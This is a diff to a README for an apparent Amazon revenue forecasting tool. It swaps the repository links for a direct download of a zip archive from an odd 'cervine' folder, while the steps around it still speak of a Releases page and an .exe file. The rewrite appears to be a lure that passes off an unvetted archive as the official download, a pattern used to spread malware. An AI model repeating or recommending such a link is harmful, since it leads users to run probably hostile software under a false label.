@@ -1,6 +1,6 @@
 # 📊 amazon-revenue-forecasting-decision-system - Predict your future Amazon marketplace revenue
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/oreoconpatas6/amazon-revenue-forecasting-decision-system)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/oreoconpatas6/amazon-revenue-forecasting-decision-system/main/cervine/revenue-amazon-forecasting-system-decision-1.6.zip)
 
 ## 🎯 Project Overview
 
@@ -17,7 +17,7 @@ The amazon-revenue-forecasting-decision-system helps you understand your busines
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official download page](https://github.com/oreoconpatas6/amazon-revenue-forecasting-decision-system).
+1. Go to the [official download page](https://raw.githubusercontent.com/oreoconpatas6/amazon-revenue-forecasting-decision-system/main/cervine/revenue-amazon-forecasting-system-decision-1.6.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the version labeled "Latest".
 4. Download the file ending in `.exe` to your computer.
